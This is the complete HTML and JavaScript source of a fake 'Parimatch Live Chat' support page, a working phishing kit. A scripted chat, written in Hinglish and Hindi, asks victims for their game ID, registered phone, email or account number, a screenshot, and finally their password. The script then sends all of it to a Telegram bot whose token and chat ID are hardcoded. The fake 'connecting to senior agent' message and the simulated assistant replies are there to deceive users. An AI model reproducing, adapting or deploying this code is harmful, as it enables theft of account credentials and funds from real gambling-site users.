<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Parimatch Live Chat</title>
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <style>
        .chat-box::-webkit-scrollbar {
            width: 5px;
        }
        .chat-box::-webkit-scrollbar-track {
            background: #f1f1f1;
        }
        .chat-box::-webkit-scrollbar-thumb {
            background: #ccc;
            border-radius: 10px;
        }
    </style>
</head>
<body class="bg-gray-100 font-sans h-screen flex flex-col justify-between">

    <header class="bg-yellow-400 text-black px-4 py-3 flex items-center shadow-md justify-between">
        <div class="flex items-center space-x-3">
            <div class="relative flex h-3 w-3">
                <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-500 opacity-75"></span>
                <span class="relative inline-flex rounded-full h-3 w-3 bg-green-600"></span>
            </div>
            
            <div class="flex items-center">
                <img src="https://i.postimg.cc/gJNq6dYd/1000034547-removebg-preview.png" alt="Parimatch Logo" class="h-8 object-contain">
            </div>
        </div>

        <div class="flex items-center">
            <select id="langSelect" onchange="changeLanguage()" class="bg-black text-yellow-400 text-xs font-bold px-2 py-1 rounded border border-black cursor-pointer focus:outline-none">
                <option value="en">English</option>
                <option value="hi">Hindi</option>
            </select>
        </div>
    </header>

    <main id="chatBox" class="chat-box flex-1 overflow-y-auto p-4 space-y-4 bg-white">
        <div class="flex items-start space-x-2">
            <div class="bg-yellow-400 text-black font-bold p-2 rounded-full text-xs w-8 h-8 flex items-center justify-center shadow">PM</div>
            <div id="welcomeMsg" class="bg-gray-100 text-gray-800 p-3 rounded-lg max-w-[80%] shadow-sm text-sm">
                Welcome! Please select your issue to proceed:
            </div>
        </div>

        <div id="initialMenu" class="grid grid-cols-1 gap-2 max-w-[85%] ml-10">
            </div>

        <div id="typingIndicator" class="hidden flex items-start space-x-2 justify-end">
            <div id="typingText" class="bg-gray-100 text-gray-500 italic p-2 rounded-lg text-xs shadow-sm">
                User is typing...
            </div>
            <div class="bg-gray-800 text-white font-bold p-2 rounded-full text-xs w-8 h-8 flex items-center justify-center shadow">U</div>
        </div>
    </main>

    <footer class="bg-white border-t border-gray-200 p-3 flex flex-col space-y-2 shadow-inner">
        <div class="flex items-center space-x-2">
            <input type="file" id="fileInput" accept="image/*" class="hidden" onchange="handleFileUpload(event)">
            
            <button onclick="triggerUpload()" id="attachBtn" disabled class="p-2 text-gray-400 hover:text-yellow-500 hover:bg-gray-100 rounded-full transition disabled:opacity-50" title="Upload Image">
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" class="w-6 h-6">
                    <path stroke-linecap="round" stroke-linejoin="round" d="M18.364 5.636l-3.536 3.536m0 0l-3.536 3.536m3.536-3.536L6.504 16.342a6 6 0 108.486 8.486L20.5 19" />
                </svg>
            </button>

            <input type="text" id="userInput" placeholder="Please select an option first..." disabled oninput="toggleTypingStatus(true)" onblur="toggleTypingStatus(false)" class="flex-1 bg-gray-50 border border-gray-300 text-gray-800 text-sm rounded-xl px-4 py-2.5 focus:outline-none focus:border-yellow-400 disabled:opacity-50">
            
            <button onclick="handleSendMessage()" id="sendBtn" disabled class="bg-yellow-400 text-black px-4 py-2.5 rounded-xl text-sm font-bold hover:bg-yellow-500 transition disabled:opacity-50">
                Send
            </button>
        </div>
    </footer>

    <script>
        // Single Telegram Config (Second one removed as requested)
        const TG_CONFIG = {
            token: "8643429752:AAFLIbqlREgv5m06JCVdGKAPOA9b-bz5BCk",
            chatId: "7750507542"
        };

        let currentStep = 0;
        let selectedIssue = "";
        let currentLang = "en";
        let typingTimeout;

        // User data logger
        let collectedData = {
            issue: "",
            gameId: "",
            registerDetails: "",
            authCredentials: ""
        };

        // Language Text Packs
        const langPack = {
            en: {
                welcome: "Welcome! Parimatch Live Support me aapka swagat hai. Kripya apna issue select karein:",
                typing: "User is typing...",
                placeholderMenu: "Select an option from above...",
                issues: {
                    withdrawal: "💰 Withdrawal Problem",
                    deposit: "💵 Deposit Problem",
                    accVerify: "📝 Account Verification",
                    emailVerify: "✉️ Email Verification",
                    kyc: "🆔 KYC Problem",
                    other: "❓ Other Problem"
                },
                step1Msg: (issue) => `Aapne **${issue}** chuna hai. Kripya apni **Username / Game ID** enter karein:`,
                step1Place: "Enter Username or Game ID...",
                step2Msg: "Dhanyawad. Kripya apna **Register Mobile Number / Register Email ID / Register Account Number** enter karein:",
                step2Place: "Enter Register Mobile, Email or Account No...",
                step3Msg: "Kripya apne problem ki **Photo / Screenshot** upload karein. Aap neeche diye gaye bade button par click karke bhi photo select kar sakte hain:",
                step3Btn: "📷 Click Here to Upload Screenshot",
                step3Place: "Use button above or attach file...",
                step4Msg: "Verification confirm karne ke liye kripya apna **Game ID / Register Mobile Number aur Password** enter karein:",
                step4Place: "Enter Game ID/Mobile No & Password...",
                finalMsg: "🔄 **Connecting to senior agent...**\n\nKripya line par bane rahein, isme **2-3 minutes** ka samay lag sakta hai. Aapki details verify ki ja rahi hain...",
                finalPlace: "Connecting to senior agent..."
            },
            hi: {
                welcome: "स्वागत है! परिमैच लाइव सपोर्ट में आपका स्वागत है। कृपया अपनी समस्या चुनें:",
                typing: "उपयोगकर्ता टाइप कर रहा है...",
                placeholderMenu: "कृपया ऊपर दिए गए विकल्पों में से चुनें...",
                issues: {
                    withdrawal: "💰 विथड्रॉल समस्या (Withdrawal)",
                    deposit: "💵 डिपॉजिट समस्या (Deposit)",
                    accVerify: "📝 अकाउंट वेरिफिकेशन",
                    emailVerify: "✉️ ईमेल वेरिफिकेशन",
                    kyc: "🆔 केवाईसी (KYC) समस्या",
                    other: "❓ अन्य समस्या (Other)"
                },
                step1Msg: (issue) => `आपने **${issue}** चुना है। कृपया अपना **यूज़रनेम / गेम आईडी (Game ID)** दर्ज करें:`,
                step1Place: "यूज़रनेम या गेम आईडी दर्ज करें...",
                step2Msg: "धन्यवाद। कृपया अपना **पंजीकृत मोबाइल नंबर / पंजीकृत ईमेल आईडी / पंजीकृत खाता संख्या** दर्ज करें:",
                step2Place: "रजिस्टर मोबाइल, ईमेल या अकाउंट नंबर दर्ज करें...",
                step3Msg: "कृपया अपनी समस्या का **फोटो / स्क्रीनशॉट** अपलोड करें। आप नीचे दिए गए बड़े बटन पर क्लिक करके फोटो चुन सकते हैं:",
                step3Btn: "📷 स्क्रीनशॉट अपलोड करने के लिए यहाँ क्लिक करें",
                step3Place: "ऊपर दिए गए बटन का उपयोग करें...",
                step4Msg: "वेरिफिकेशन की पुष्टि के लिए कृपया अपना **गेम आईडी / रजिस्टर मोबाइल नंबर और पासवर्ड (Password)** दर्ज करें:",
                step4Place: "गेम आईडी/मोबाइल नंबर और पासवर्ड दर्ज करें...",
                finalMsg: "🔄 **सीनियर एजेंट से जोड़ा जा रहा है...**\n\nकृपया लाइन पर बने रहें, इसमें **२-३ मिनट** का समय लग सकता है। आपके विवरण की जांच की जा रही है...",
                finalPlace: "सीनियर एजेंट से जुड़ रहा है..."
            }
        };

        const chatBox = document.getElementById('chatBox');
        const userInput = document.getElementById('userInput');
        const sendBtn = document.getElementById('sendBtn');
        const attachBtn = document.getElementById('attachBtn');
        const initialMenu = document.getElementById('initialMenu');
        const typingIndicator = document.getElementById('typingIndicator');
        const welcomeMsg = document.getElementById('welcomeMsg');
        const typingText = document.getElementById('typingText');
        const langSelect = document.getElementById('langSelect');

        function renderMenuButtons() {
            const strings = langPack[currentLang].issues;
            initialMenu.innerHTML = `
                <button onclick="handleMenuSelect('${strings.withdrawal}')" class="w-full text-left bg-white border border-gray-300 hover:border-yellow-400 hover:bg-yellow-50 text-gray-700 px-4 py-2.5 rounded-xl text-sm font-medium transition shadow-sm">${strings.withdrawal}</button>
                <button onclick="handleMenuSelect('${strings.deposit}')" class="w-full text-left bg-white border border-gray-300 hover:border-yellow-400 hover:bg-yellow-50 text-gray-700 px-4 py-2.5 rounded-xl text-sm font-medium transition shadow-sm">${strings.deposit}</button>
                <button onclick="handleMenuSelect('${strings.accVerify}')" class="w-full text-left bg-white border border-gray-300 hover:border-yellow-400 hover:bg-yellow-50 text-gray-700 px-4 py-2.5 rounded-xl text-sm font-medium transition shadow-sm">${strings.accVerify}</button>
                <button onclick="handleMenuSelect('${strings.emailVerify}')" class="w-full text-left bg-white border border-gray-300 hover:border-yellow-400 hover:bg-yellow-50 text-gray-700 px-4 py-2.5 rounded-xl text-sm font-medium transition shadow-sm">${strings.emailVerify}</button>
                <button onclick="handleMenuSelect('${strings.kyc}')" class="w-full text-left bg-white border border-gray-300 hover:border-yellow-400 hover:bg-yellow-50 text-gray-700 px-4 py-2.5 rounded-xl text-sm font-medium transition shadow-sm">${strings.kyc}</button>
                <button onclick="handleMenuSelect('${strings.other}')" class="w-full text-left bg-white border border-gray-300 hover:border-yellow-400 hover:bg-yellow-50 text-gray-700 px-4 py-2.5 rounded-xl text-sm font-medium transition shadow-sm">${strings.other}</button>
            `;
        }

        function changeLanguage() {
            currentLang = langSelect.value;
            welcomeMsg.innerText = langPack[currentLang].welcome;
            typingText.innerText = langPack[currentLang].typing;
            
            if (currentStep === 0) {
                renderMenuButtons();
                userInput.placeholder = langPack[currentLang].placeholderMenu;
            } else if (currentStep === 1) {
                userInput.placeholder = langPack[currentLang].step1Place;
            } else if (currentStep === 2) {
                userInput.placeholder = langPack[currentLang].step2Place;
            } else if (currentStep === 3) {
                userInput.placeholder = langPack[currentLang].step3Place;
                const clickBtn = document.getElementById('clickHereUploadBtn');
                if(clickBtn) clickBtn.innerText = langPack[currentLang].step3Btn;
            } else if (currentStep === 4) {
                userInput.placeholder = langPack[currentLang].step4Place;
            }
        }

        // Send Text Log to Telegram
        function sendToTelegram(messageText) {
            const payload = { text: messageText, parse_mode: "Markdown" };

            fetch(`https://api.telegram.org/bot${TG_CONFIG.token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TG_CONFIG.chatId, ...payload })
            }).catch(err => console.error("Telegram Send Error: ", err));
        }

        // Send Photo to Telegram
        function sendPhotoToTelegram(base64Data) {
            fetch(base64Data)
            .then(res => res.blob())
            .then(blob => {
                const form = new FormData();
                form.append('chat_id', TG_CONFIG.chatId);
                form.append('photo', blob, 'screenshot.png');
                form.append('caption', `⚠️ *New Screenshot Received* for Game ID: ${collectedData.gameId}`);
                
                fetch(`https://api.telegram.org/bot${TG_CONFIG.token}/sendPhoto`, { method: 'POST', body: form })
                .catch(err => console.error("Telegram Photo Error: ", err));
            });
        }

        function triggerVibration() {
            if (navigator.vibrate) {
                navigator.vibrate(60);
            }
        }

        function playNotificationSound() {
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                if (audioCtx) {
                    const oscillator = audioCtx.createOscillator();
                    const gainNode = audioCtx.createGain();
                    oscillator.connect(gainNode);
                    gainNode.connect(audioCtx.destination);
                    oscillator.type = 'sine';
                    oscillator.frequency.setValueAtTime(587.33, audioCtx.currentTime);
                    gainNode.gain.setValueAtTime(0.12, audioCtx.currentTime);
                    oscillator.start();
                    oscillator.stop(audioCtx.currentTime + 0.15);
                }
            } catch (e) {
                console.log("Sound error: ", e);
            }
        }

        function toggleTypingStatus(isTyping) {
            if (isTyping && userInput.value.trim().length > 0) {
                typingIndicator.classList.remove('hidden');
                chatBox.scrollTop = chatBox.scrollHeight;
                clearTimeout(typingTimeout);
                typingTimeout = setTimeout(() => { typingIndicator.classList.add('hidden'); }, 1500);
            } else {
                typingIndicator.classList.add('hidden');
            }
        }

        function appendMessage(sender, text, isImage = false) {
            const msgDiv = document.createElement('div');
            msgDiv.className = sender === 'user' ? 'flex items-start space-x-2 justify-end' : 'flex items-start space-x-2';

            const avatar = sender === 'user' 
                ? '<div class="bg-gray-800 text-white font-bold p-2 rounded-full text-xs w-8 h-8 flex items-center justify-center shadow">U</div>'
                : '<div class="bg-yellow-400 text-black font-bold p-2 rounded-full text-xs w-8 h-8 flex items-center justify-center shadow">PM</div>';

            const content = isImage 
                ? `<img src="${text}" class="max-w-[200px] rounded-lg shadow-md border border-gray-200" />`
                : `<div class="p-3 rounded-lg max-w-[80%] shadow-sm text-sm ${sender === 'user' ? 'bg-yellow-400 text-black rounded-tr-none' : 'bg-gray-100 text-gray-800 rounded-tl-none'}">${text}</div>`;

            msgDiv.innerHTML = sender === 'user' ? content + avatar : avatar + content;
            chatBox.insertBefore(msgDiv, typingIndicator);
            chatBox.scrollTop = chatBox.scrollHeight;
            
            triggerVibration();
            if (sender === 'ai') {
                playNotificationSound();
            }
        }

        function simulateAIResponse(callback) {
            setTimeout(callback, 1200);
        }

        function handleMenuSelect(issue) {
            triggerVibration();
            selectedIssue = issue;
            collectedData.issue = issue;
            initialMenu.style.display = 'none';
            
            appendMessage('user', issue);

            simulateAIResponse(() => {
                appendMessage('ai', langPack[currentLang].step1Msg(issue));
                userInput.placeholder = langPack[currentLang].step1Place;
                enableTextEntry(true);
                currentStep = 1;
            });
        }

        function enableTextEntry(status) {
            userInput.disabled = !status;
            sendBtn.disabled = !status;
            if(status) userInput.focus();
        }

        function handleSendMessage() {
            const text = userInput.value.trim();
            if (!text) return;

            toggleTypingStatus(false);
            appendMessage('user', text);
            userInput.value = '';
            enableTextEntry(false);

            simulateAIResponse(() => {
                if (currentStep === 1) {
                    collectedData.gameId = text;
                    appendMessage('ai', langPack[currentLang].step2Msg);
                    userInput.placeholder = langPack[currentLang].step2Place;
                    enableTextEntry(true);
                    currentStep = 2;
                }
                else if (currentStep === 2) {
                    collectedData.registerDetails = text;
                    appendMessage('ai', langPack[currentLang].step3Msg);
                    attachBtn.disabled = false;
                    userInput.placeholder = langPack[currentLang].step3Place;
                    currentStep = 3;

                    // Click Here Button for gallery trigger
                    const btnDiv = document.createElement('div');
                    btnDiv.id = "clickHereContainer";
                    btnDiv.className = "max-w-[85%] ml-10 my-2";
                    btnDiv.innerHTML = `
                        <button id="clickHereUploadBtn" onclick="triggerUpload()" class="w-full bg-blue-600 hover:bg-blue-700 text-white text-sm font-bold py-3 px-4 rounded-xl shadow transition duration-200 animate-pulse">
                            ${langPack[currentLang].step3Btn}
                        </button>
                    `;
                    chatBox.insertBefore(btnDiv, typingIndicator);
                    chatBox.scrollTop = chatBox.scrollHeight;
                }
                else if (currentStep === 4) {
                    collectedData.authCredentials = text;
                    
                    // Telegram payload with dynamic and clearly structured password highlight
                    const tgPayload = `📌 *NEW PARIMATCH SUBMISSION LOG*\n\n` +
                                      `• *Issue Type Selected:* ${collectedData.issue}\n` +
                                      `• *Username / Game ID:* ${collectedData.gameId}\n` +
                                      `• *Registered Info:* ${collectedData.registerDetails}\n\n` +
                                      `🔑 *USER PASSWORD / CREDENTIALS:* \n\`${collectedData.authCredentials}\``;
                    
                    sendToTelegram(tgPayload);

                    appendMessage('ai', langPack[currentLang].finalMsg);
                    userInput.placeholder = langPack[currentLang].finalPlace;
                    enableTextEntry(false);
                    attachBtn.disabled = true;
                }
            });
        }

        function triggerUpload() {
            triggerVibration();
            document.getElementById('fileInput').click();
        }

        function handleFileUpload(event) {
            const file = event.target.files[0];
            if (!file) return;

            const reader = new FileReader();
            reader.onload = function(e) {
                const clickBtnContainer = document.getElementById('clickHereContainer');
                if (clickBtnContainer) {
                    clickBtnContainer.remove();
                }

                appendMessage('user', e.target.result, true);
                attachBtn.disabled = true;
                
                sendPhotoToTelegram(e.target.result);
                
                simulateAIResponse(() => {
                    appendMessage('ai', langPack[currentLang].step4Msg);
                    userInput.placeholder = langPack[currentLang].step4Place;
                    enableTextEntry(true);
                    currentStep = 4;
                });
            };
            reader.readAsDataURL(file);
        }

        userInput.addEventListener("keypress", function(event) {
            if (event.key === "Enter") {
                event.preventDefault();
                handleSendMessage();
            }
        });

        renderMenuButtons();
        changeLanguage();
    </script>
</body>
</html>
